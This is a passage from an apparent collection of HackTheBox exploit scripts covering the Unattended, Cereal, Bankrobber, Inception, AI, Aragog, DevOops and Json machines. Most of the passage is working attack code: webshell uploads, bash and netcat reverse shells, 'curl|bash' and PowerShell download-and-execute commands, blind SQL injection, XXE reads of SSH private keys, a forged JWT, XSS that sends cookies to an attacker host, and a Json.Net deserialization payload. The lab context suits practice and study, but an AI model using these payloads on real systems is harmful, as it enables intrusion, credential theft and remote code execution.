'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
    
# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                   
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                
        thread.start()                                                  
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()
        
# Let's login as admin
def loginAdmin(rhost):
    print("[+] Let's login as Admin [+]")
    url = "http://%s:80/login.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "admin", "password": "QNKCDZO"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] Login successss ! [+]")
    
# Let's create the malicious php file
def createPayload():
    print("[+] Creating the malicious file [+]")
    payload = "GIF89a;\n"
    payload += "<?php system($_REQUEST[\"cmd\"]); ?>"
    f = open("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png", "a")
    f.write(payload)
    f.close()
    print("[+] Created !!!! [+]")
    
# Let's create the shell.sh file
def createShell(lhost,lport):
    print("[+] Creating the malicious shell file [+]")
    payload = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    f = open("shell.sh", "w")
    f.write(payload)
    f.close()
    print("[+] Created !!!! [+]")
    
# Let's upload the malicious php file
def uploadMalicious(rhost,lhost,malicious):
    print("[+] Uploading the malicious file [+]")
    url = "http://%s:80/upload.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1"}
    data = {"url": "http://%s/%s" %(lhost,malicious)}
    upup = r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    print("[+] Uploadeddededede ! [+]")
    upload_malicious = re.search('New name is (.*)', upup.text).group(1)
    upload_malicious = upload_malicious.removesuffix(".")
    folder = re.search('uploads/(.*);', upup.text).group(1)
    global upload_url
    upload_url = "uploads/" + folder + "/" + upload_malicious

# Trigger the reverse shell
def reverseShell(rhost,upload_url):
    print("[+] Now Let's Get The Reverse Shell!!!! [+]")
    payload = "cmd=curl+10.10.14.20/shell.sh|bash"
    urllib.parse.quote(payload, safe='')
    url = "http://%s:80/%s" %(rhost,upload_url)
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1"}
    r.post(url, headers=headers, cookies=r.cookies, proxies=proxies, data=payload)
    # Cleaning up
    cleaningMess()

# Function to delete the files created
def cleaningMess():
    os.system("rm Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png")
    os.system("shell.sh")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--localip', help='Local ip address or hostname to receive the shell', required=True)
    parser.add_argument('-p', '--localport', help='Local port to receive the shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.localip
    lport = args.localport

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Create the payload file
    createPayload()
    # Create the sh file
    createShell(lhost,lport)
    # Login as admin
    loginAdmin(rhost)
    # Upload the malicious file
    malicious = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png"
    uploadMalicious(rhost,lhost,malicious)
    # Get the reverse shell
    reverseShell(rhost,upload_url)

if __name__ == '__main__':
    main()
```

### Unattended
#### sqli_version.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# SQLInjection Blind Version Extract - Unattended HackTheBox
import argparse
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
def getVersion(rhost):
    sqli_target = 'https://' + rhost +"/index.php?id=465'"
    limit = 1
    char = 42
    prefix = []
    print("[+] The version of MySQL is.... [+]")
    while(char!=123):
        injection_string = "and ascii(substring(version(),%d,1))= %s -- -" %(limit,char)
        target_prefix = sqli_target + injection_string
        response = r.get(target_prefix,proxies=proxies,verify=False,cookies=r.cookies).text
        # On the if put a error message (not success)
        if "we are very sorry to show" not in response:
            prefix.append(char)
            limit=limit+1
            extracted_char = ''.join(map(chr,prefix))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            char=42
        else:
            char=char+1
            prefix = []

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target

    '''Here we call the functions'''
    # Let's get the version of it
    getVersion(rhost)

if __name__ == '__main__':
    main()
```

#### sqli_reverse_shell.py
```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Reverse Shell - www-data - Unattended HackTheBox
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
import urllib.parse
import urllib3

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
    
# Exploit
def getReverse(rhost,lhost,lport):
    url = "https://%s/index.php?" %rhost
    # Get to get the phpsessid
    r.get(url, verify=False, proxies=proxies)
    php_value = r.cookies['PHPSESSID']
    # Setting the php malicious to the browser and the phpsseid in the correct order to trigger the execution
    my_super_cookie = requests.cookies.create_cookie('0x4rt3mis',"<%3fphp+system($_GET['cmd'])%3b+%3f>")
    r.cookies.set_cookie(my_super_cookie)
    print("[+] Now Let's get the reverse shell! [+]")
    payload = {
    'cmd': "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" %(lhost,lport),
    'id': "25' and 1=2 UNION select '0x4rt3mis\\' union select \\'/var/lib/php/sessions/sess_%s\\'-- -'-- -" %php_value
}
    payload_str = urllib.parse.urlencode(payload, safe="\'\>/")
    r.get(url, params=payload_str, proxies=proxies, cookies=r.cookies, verify=False)
    # Just got the reverse shell with two get, only one did not work (don't know why, haha)
    r.get(url, params=payload_str, proxies=proxies, cookies=r.cookies, verify=False)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--ip', help='Local IP Reverse Shell', required=True)
    parser.add_argument('-p', '--port', help='Local Port Reverse Shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.ip
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Get the rev shell
    getReverse(rhost,lhost,lport)

if __name__ == '__main__':
    main()
```

### Cereal
#### jwt_create.py

```python
#!/usr/bin/env python3
import jwt
from datetime import datetime, timedelta

print(jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
```

#### auto_reverse.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# HackTheBox - Cereal - Auto reverse shell

import argparse
import requests
import sys
import jwt
from datetime import datetime, timedelta
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket, telnetlib
from threading import Thread
import os
import re
import urllib3

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Create the JWT Token
def createJWT():
    print("[+] Let's create the JWT Token [+]")
    global token
    token = jwt.encode({'name': "admin", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256")
    print("[+] Token Created [+]")
    return token
    
def sendXSS(rhost,token,lhost):
    print("[+] Let's send the XSS [+]")
    os.system("cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx")
    url = "https://%s:443/requests" %rhost
    headers = {"Authorization": "Bearer %s" %token, "Content-Type": "application/json"}
    json={"JSON": "{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"http://%s/shell.aspx\",\"FilePath\": \"C:\\\\inetpub\\\\source\\\\uploads\\\\shell.aspx\"}" %lhost, "RequestId": 666}
    r.post(url, headers=headers, json=json, proxies=proxies, verify=False)
    print("[+] XSS Sent ! [+]")

def triggerXSS(rhost,token):
    print("[+] Trigger the XSS [+]")
    url = "https://%s:443/requests" %rhost
    headers = {"Authorization": "Bearer %s" %token, "Content-Type": "application/json"}
    json={"json": "{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://" + rhost + "/requests/666', true%29;xhr.setRequestHeader%28'Authorization','Bearer " + token + "'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"0x4rt3mis\"}"}
    r.post(url, headers=headers, json=json, proxies=proxies, verify=False)
    print("[+] Triggered, wait one minute to be done ! [+]")
    
# Mount the payload
def mountPayload(lhost,lport):
    print("[+] Meanwhile, let's mount the ps1 payload [+]")
    if os.path.isfile('Invoke-PowerShellTcp.ps1'):
        os.system("rm Invoke-PowerShellTcp.ps1")
    print("[+] Let's download the Nishang reverse [+]")
    os.system("wget -q -c https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
    print("[+] Download Ok! [+]")
    print("[+] Let's add the call to reverse shell! [+]")
    file = open('Invoke-PowerShellTcp.ps1', 'a')
    file.write('Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s' %(lhost,lport))
    file.close()
    print("[+] Call added! [+]")

def getRCE(rhost,command):
    print("[+] Now, let's get the reverse [+]")
    print("[+] Waiting the server download the aspx !!! [+]")
    os.system("sleep 150")
    url = "https://source.%s:443/uploads/21098374243-shell.aspx" %rhost
    headers = {"Referer": "https://source.cereal.htb/uploads/21098374243-shell.aspx", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://source.cereal.htb"}
    # First req to get the right parameters
    req = r.post(url, headers=headers, proxies=proxies, verify=False)
    STATE = re.search('input.+?name="__VIEWSTATE".+?value="(.+?)"', req.text).group(1)
    GENERATOR = re.search('input.+?name="__VIEWSTATEGENERATOR".+?value="(.+?)"', req.text).group(1)
    VALIDATION = re.search('input.+?name="__EVENTVALIDATION".+?value="(.+?)"', req.text).group(1)
    data = {"__VIEWSTATE": "%s" %STATE, "__VIEWSTATEGENERATOR": "%s" %GENERATOR, "__EVENTVALIDATION": "%s" %VALIDATION, "txtArg": "%s" %command, "testing": "excute"}
    # Now just send the commands
    req1 = r.post(url, headers=headers, proxies=proxies, verify=False, data=data)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--localip', help='Local IP to receive the reverse', required=True)
    parser.add_argument('-p', '--localport', help='Local Port to receive the reverse', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.localip
    lport = args.localport

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Create the token
    createJWT()
    # Send XSS
    sendXSS(rhost,token,lhost)
    # Trigger XSS
    triggerXSS(rhost,token)
    # Let's mount the payload
    mountPayload(lhost,lport)
    # Let's get the reverse now
    command = "powershell IEX(New-Object Net.WebClient).downloadString('http://%s/Invoke-PowerShellTcp.ps1')" %lhost
    getRCE(rhost,command)
    
if __name__ == '__main__':
    main()
```

### Bankrobber

#### get_cookie.js

```js
function send_cookie(){
	var req = new XMLHttpRequest();
	req.open('GET', 'http://10.10.14.20/?xss=' + document.cookie, true);
	req.send();
}

send_cookie();
```

#### auto_reverse.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Exploit - Auto Reverse Shell - BankRobber - HackTheBox
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    os.system("rm 0x4rt3mis.js")
    os.system("rm nc.exe")
    t.interact()

def createPayloadJS(lhost,lport):
    print("[+] Preparing the payload !! [+]")
    os.system("cp /usr/share/windows-binaries/nc.exe .")
    payload = "function getRCE(){\n"
    payload += "        var rev = new XMLHttpRequest();\n"
    payload += "        var url = 'http://localhost/admin/backdoorchecker.php';\n"
    payload += "        var data = 'cmd=dir|powershell -c \"iwr -uri " + lhost + "/nc.exe -outfile %temp%\\\\nc.exe\"; %temp%\\\\nc.exe -e cmd.exe " + lhost + " " + lport + "';\n"
    payload += "        rev.open('POST', url, true);\n"
    payload += "        rev.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n"
    payload += "        rev.send(data);\n"
    payload += "}\n"
    payload += "\n"
    payload += "getRCE()"
    f = open("0x4rt3mis.js", "w")
    f.write(payload)
    f.close()
    print("[+] Done !! [+]")
    
def createAccount(rhost):
    print("[+] Creating Account ! [+]")
    url = "http://%s:80/register.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "pounds": "Submit Query"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] Created ! [+]")
    
def loginAccount(rhost):
    print("[+] Just Login ! [+]")
    url = "http://%s:80/login.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "pounds": "Submit Query"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies)
    print("[+] Logged In ! [+]")
    
def launchXSS(rhost):
    print("[+] Let's trigger XSS ! [+]")
    url = "http://%s:80/user/transfer.php" %rhost
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    data = {"fromId": "3", "toId": "1", "amount": "1", "comment": "<script src=\"http://10.10.14.20/0x4rt3mis.js\"></script>"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    print("[+] Triggered, wait 120 seconds ! [+]")
    os.system("sleep 120")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--port', help='Local port to receive shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.port

    '''Here we call the functions'''
    # Set up the web python server
    webServer()
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Create the JS payload
    createPayloadJS(lhost,lport)
    # Create Account
    createAccount(rhost)
    # Login
    loginAccount(rhost)
    # Trigger and wait
    launchXSS(rhost)

if __name__ == '__main__':
    main()
```

### Inception
#### auto_lfi.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto LFI dompdf - Inception HackTheBox
import argparse
import requests
import sys
import re
import base64

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to decode base64
def b64d(s):
    return base64.b64decode(s).decode()

# Function to get the base64 content
def readFile(rhost,file):
    print("[+] Let's get the file you want !! [+]")
    print("[+] The file is %s !! [+]" %file)
    print(" ----------------------------------------- ")
    url = "http://%s:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=%s" %(rhost,file)
    response = r.get(url, proxies=proxies)
    base64_file= re.search('\[\(.*\]', response.text).group(0)
    base64_file = base64_file.removeprefix('[(').removesuffix(')]')
    base64_decoded = b64d(base64_file)
    print(base64_decoded.strip())
    print(" ----------------------------------------- ")
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's read the file
    readFile(rhost,file)

if __name__ == '__main__':
    main()
```

### AI 
#### auto_sqli.py
```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# AI HackTheBox auto SQLInjection and SSH Login
import argparse
import requests
import sys
import os
from bs4 import BeautifulSoup
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# First let's get the username
def getUsername(rhost):
    print("[+] Let's get the username !!! [+]")
    url = "http://%s/ai.php" %rhost
    os.system('flite -w /tmp/test.wav -voice rms -t  "open single quote space union select space username space from users comment database"')
    multipart_data = {
        'fileToUpload': ('test.wav', open('/tmp/test.wav', 'rb'), "audio/x-wav"),
        'submit' : (None,"Process It")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
    os.system('rm /tmp/test.wav ')
    global username
    username = re.search('Query result : (.*)', upload.text).group(1)
    username = username.removesuffix("<h3>")
    print("[+] Your username is : %s !! [+]" %username)
    
# Then get the password
def getPassword(rhost):
    print("[+] Let's get the password !!! [+]")
    url = "http://%s/ai.php" %rhost
    os.system('flite -w /tmp/test.wav -voice rms -t  "open single quote space union select space password space from users comment database"')
    multipart_data = {
        'fileToUpload': ('test.wav', open('/tmp/test.wav', 'rb'), "audio/x-wav"),
        'submit' : (None,"Process It")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
    os.system('rm /tmp/test.wav ')
    global password
    password = re.search('Query result : (.*)', upload.text).group(1)
    password = password.removesuffix("<h3>")
    print("[+] Your password is : %s !! [+]" %password)

# Now let's ssh in
def sshLogin(rhost,username,password):
    print("[+] Now, let's ssh in !!!! [+]")
    command = 'sshpass -p "%s" ssh %s@%s /bin/bash' %(password,username,rhost)
    os.system(command)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    rhost = args.target

    '''Here we call the functions'''
    # Let's get the username
    getUsername(rhost)
    # Let's get the password
    getPassword(rhost)
    # Now, let's ssh in
    sshLogin(rhost,username,password)

if __name__ == '__main__':
    main()
```

### Aragog

#### auto_ssh.py
```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE in Aragog to retrieve the ssh key from florian user and auto connect
import argparse
import requests
import sys
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to XEE the Florian ssh key
def getXEEKey(rhost):
    url = "http://%s:80/hosts.php" %rhost
    data = '''<?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data (ANY)>
    <!ENTITY file SYSTEM "file:///home/florian/.ssh/id_rsa">
    ]>

    <details>
        <subnet_mask>&file;</subnet_mask>
        <test></test>
    </details> '''
    florian_key = r.post(url, data=data, proxies=proxies)
    print("[+] Let's get the florian ssh key !!! [+]")
    index = florian_key.text.find("for")
    global key
    key = florian_key.text[index:index+1683].removeprefix('for ').strip()

#Function to connect ssh on the box
def connectSSH(rhost,key):
    print("[+] Done! Now Let's connect!!!! [+]")
    ssh_key = '/tmp/rsa_key'
    f = open(ssh_key, 'w'); f.write(key); f.close()
    os.system('chmod 400 /tmp/rsa_key')
    os.system('sleep 1')
    os.system('ssh -i /tmp/rsa_key florian@%s' %rhost)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target

    '''Here we call the functions'''
    # Let's get the ssh key
    getXEEKey(rhost)
    # Let's connect
    connectSSH(rhost,key)

if __name__ == '__main__':
    main()
```

#### auto_lfi.py
```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE in Aragog to retrieve files
import argparse
import requests
import sys
import os
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to XEE files
def getXEEKey(rhost,file):
    print("[+] Let's get the file for you !!! [+]")
    url = "http://%s:80/hosts.php" %rhost
    xml_xee = '''<?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data (ANY)>
    <!ENTITY file SYSTEM "file:///%s">
    ]>

    <details>
        <subnet_mask>&file;</subnet_mask>
        <test></test>
    </details> ''' %file
    lfi_file = r.post(url, data=xml_xee, proxies=proxies)
    if lfi_file.status_code == 200:
        match = re.search(r'for .*', lfi_file.text, re.DOTALL).group(0)
        print(match.removeprefix('for ').strip())
    else:
        print("[+] Sorry, file does not exist. Try with another file !! [+]")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's get the ssh key
    getXEEKey(rhost,file)

if __name__ == '__main__':
    main()
```

### DevOops

#### auto_ssh.py
```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE in DevOops to retrieve files
import argparse
import requests
import sys
import os
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to XEE files
def getXEEKey(rhost,file):
    print("[+] Let's get the file for you !!! [+]")
    url = "http://%s:5000/upload" %rhost
    xml_xee = f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///%s">
]>

<payload>
  <Author>&file;</Author>
  <Subject>XEE</Subject>
  <Content>0x4rt3mis</Content>
</payload> ''' %file

    files = {'file': ('xxe.xml', xml_xee, 'text/xml')}
    roosa_key = r.post(url, files=files, proxies=proxies)
    if roosa_key.status_code == 200:
        match = re.search(r'Author:.*Subject', roosa_key.text, re.DOTALL).group(0)
        print(match.removesuffix('\n Subject').removeprefix('Author: '))
    else:
        print("[+] Sorry, file does not exist. Try with another file !! [+]")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's get the ssh key
    getXEEKey(rhost,file)

if __name__ == '__main__':
    main()
```

### Json
#### auto_rev.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto JSON.Net Deserealizaiton Exploit - JSON HackTheBox
# Date: 19/09/21
import argparse
import requests
import sys
import base64
import os
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket, telnetlib
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setup the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Mount the payload
def mountPayload(lhost,lport):
    if os.path.isfile('Invoke-PowerShellTcp.ps1'):
        os.system("rm Invoke-PowerShellTcp.ps1")
    print("[+] Let's download the Nishang reverse [+]")
    os.system("wget -q -c https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
    print("[+] Download Ok! [+]")
    print("[+] Let's add the call to reverse shell! [+]")
    file = open('Invoke-PowerShellTcp.ps1', 'a')
    file.write('Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s' %(lhost,lport))
    file.close()
    print("[+] Call added! [+]")

# Function to create the ysoserial payload
def createPayload(lhost):
''' 
Command used in windowns box with ysoserial with some modifications to get the ps1 reverse shell
ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 10.10.14.20"
'''
    pay ="{\n"
    pay +="    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\n"
    pay +="    'MethodName':'Start',\n"
    pay +="    'MethodParameters':{\n"
    pay +="        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n"
    pay +="        '$values':['cmd','/c powershell.exe IEX(New-Object Net.WebClient).DownloadString(\\'http://%s/Invoke-PowerShellTcp.ps1\\')']\n" %lhost
    pay +="    },\n"
    pay +="    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n"
    pay +="}"
    global payload
    payload = b64e(pay)

# Function just to encode base64 things
def b64e(s):
    return base64.b64encode(s.encode()).decode()
    
# Function to send the payload to the server
def sendPayload(rhost,payload):
    url = "http://%s:80/api/Account/" %rhost
    headers = {"Accept": "application/json, text/plain, */*", "Bearer": "%s" %payload}
    r.get(url, headers=headers, proxies=proxies)
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
